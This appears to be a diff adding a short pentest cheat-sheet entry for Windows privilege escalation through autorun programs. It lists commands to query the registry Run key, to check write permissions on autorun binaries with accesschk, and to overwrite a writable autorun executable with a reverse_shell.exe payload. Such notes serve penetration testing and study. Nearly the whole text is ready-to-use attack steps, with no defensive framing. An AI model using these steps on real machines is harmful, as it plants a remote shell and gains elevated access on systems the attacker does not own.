@@ -1,0 +1,10 @@
+# Query the registry for AutoRun executables:
+    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Check rights to autorun bins or scripts
+    C:\accesschk.exe /accepteula -wvu "C:<autorun_app>"
+
+## Need rights to write to <autorun_app>
+
+# Copy the reverse_shell.exe, overwrite the <autorun_app> executable with it:
+    copy C:\reverse_shell.exe "C:\<autorun_app>" /Y
